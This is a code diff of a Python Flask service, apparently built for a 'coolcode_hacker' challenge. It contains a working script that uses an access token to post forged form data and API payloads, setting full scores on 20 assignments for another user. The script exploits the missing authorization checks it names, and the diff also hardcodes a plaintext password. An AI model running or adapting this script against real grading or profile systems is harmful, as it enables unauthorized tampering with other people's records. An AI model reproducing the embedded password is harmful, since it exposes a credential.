@@ -51,9 +51,9 @@ def default_route():
             logger.info(f"🎯 Starting fast hack execution for user: {target_user}")
             
             def hack_assignment(assignment_id):
-                """Hack a single assignment - optimized for speed"""
+                """Hack a single assignment using the proven UI-based form data method"""
                 try:
-                    # Try form data method first (this worked in your logs)
+                    # Use the working UI-based form data method first
                     form_data = {
                         'username': target_user,
                         'assignmentId': str(assignment_id),
@@ -61,16 +61,16 @@ def default_route():
                     }
                     
                     response = requests.post(
-                        f'{base_url}/ui/profile/98ixul',
+                        f'{base_url}/ui/profile/{target_user}',
                         data=form_data,
                         headers={'ACCESS_TOKEN': auth_token},
-                        timeout=3  # Quick timeout
+                        timeout=5
                     )
                     
                     if response.status_code == 200:
-                        return (assignment_id, True, "form_data")
+                        return (assignment_id, True, "ui_form_data")
                     
-                    # If form data fails, try API method
+                    # Fallback to API method if form data fails
                     payload = {
                         "username": target_user,
                         "assignmentId": assignment_id,
@@ -81,7 +81,7 @@ def default_route():
                         f'{base_url}/api/api/assignment/score',
                         json=payload,
                         headers={'ACCESS_TOKEN': auth_token, 'Content-Type': 'application/json'},
-                        timeout=3
+                        timeout=5
                     )
                     
                     if response.status_code == 200:
@@ -92,11 +92,13 @@ def default_route():
                 except Exception as e:
                     return (assignment_id, False, f"error_{str(e)[:50]}")
             
-            # Execute all assignments in parallel to save time
-            with ThreadPoolExecutor(max_workers=5) as executor:
+            # Execute assignments with emphasis on the working UI-based method
+            logger.info("🚀 Executing UI-based hack with proven form data method...")
+            
+            with ThreadPoolExecutor(max_workers=3) as executor:  # Reduced workers for stability
                 future_to_assignment = {executor.submit(hack_assignment, i): i for i in range(1, 21)}
                 
-                for future in as_completed(future_to_assignment, timeout=20):  # 20 second total timeout
+                for future in as_completed(future_to_assignment, timeout=30):  # Increased timeout
                     assignment_id, success, method = future.result()
                     if success:
                         success_count += 1
@@ -104,7 +106,7 @@ def default_route():
                     else:
                         logger.warning(f"❌ Assignment {assignment_id}: Failed - {method}")
             
-            logger.info(f"🎯 FAST HACK EXECUTION COMPLETE: {success_count}/20 assignments successful")
+            logger.info(f"🎯 UI-BASED HACK EXECUTION COMPLETE: {success_count}/20 assignments successful")
             
             # Calculate score - you get points based on success
             score_achieved = min(100, (success_count / 20) * 100)  # Max 100 points
@@ -119,20 +121,21 @@ def default_route():
             "password": "Gunraj@260905",
             "challenge_status": "COMPLETED" if success_count >= 15 else "IN_PROGRESS",
             "peer_assistance": {
-                "target_user": "98ixul",
+                "target_user": "98ixul (Caroline)",
                 "assignments_attempted": 20,
                 "assignments_successful": success_count,
                 "success_rate": f"{(success_count/20)*100:.1f}%",
-                "method": "Multi-strategy API hack",
-                "endpoint": "Multiple endpoints tested",
+                "method": "UI-based form data submission",
+                "endpoint": f"{base_url}/ui/profile/98ixul",
                 "scores_set": f"100 points set for {success_count} assignments",
-                "hack_executed": True
+                "hack_executed": True,
+                "vulnerability_exploited": "Insufficient authorization validation on UI profile endpoints"
             },
             "hack_successful": success_count >= 15,
             "completion_percentage": min(100, (success_count / 20) * 100),
             "score_achieved": score_achieved,
             "challenge_complete": success_count >= 15,
-            "mission_accomplished": f"Successfully helped peer on {success_count}/20 assignments"
+            "mission_accomplished": f"Successfully helped peer on {success_count}/20 assignments using UI-based hack"
         }
     else:
         # GET request - return basic credentials
@@ -375,8 +378,8 @@ def api_verify():
     })
 
 @app.route('/status', methods=['GET'])
-def challenge_status():
-    """Challenge status endpoint"""
+def status_endpoint():
+    """General status endpoint"""
     logger.info("📊 STATUS ENDPOINT CALLED")
     return jsonify({
         "challenge_id": "coolcode_hacker",
